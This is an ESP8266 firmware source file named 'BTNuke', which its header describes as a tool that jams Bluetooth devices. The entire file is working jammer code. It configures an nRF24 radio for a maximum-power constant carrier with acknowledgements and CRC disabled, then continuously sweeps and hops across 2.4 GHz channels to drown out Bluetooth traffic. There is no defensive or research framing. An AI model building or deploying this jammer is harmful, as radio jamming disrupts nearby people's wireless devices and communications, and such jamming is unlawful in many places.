/*
 * BTNuke
 * An ESP8266-powered tool that jams Bluetooth devices.
 * Author - WireBits
 */

#include <SPI.h>
#include <RF24.h>

#define CE_PIN 4
#define CSN_PIN 5

RF24 radio(CE_PIN, CSN_PIN);

byte i = 45, ptr_hop = 0, flag = 0;
byte hopping_channel[] = {32, 34, 46, 48, 50, 52, 26, 28, 30, 74, 76, 78};  
                          
void nrfSPIInit() {
  if (radio.begin()) {
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);                                                                                                                                           
    radio.setPayloadSize(31);
    radio.setAddressWidth(4);
    radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.startConstCarrier(RF24_PA_MAX, i);
  }
}

void adjustAndSweepChannels() {
  flag = (i > 79) ? 1 : (i < 2 ? 0 : flag);
  i += flag ? -2 : 2;
  for (int j = 0; j <= 79; j++) radio.setChannel(j);
}

void setup() {
  nrfSPIInit();
}

void loop() {
  adjustAndSweepChannels();
  ptr_hop = (ptr_hop + 1) % sizeof(hopping_channel);
  radio.setChannel(hopping_channel[ptr_hop]);
}
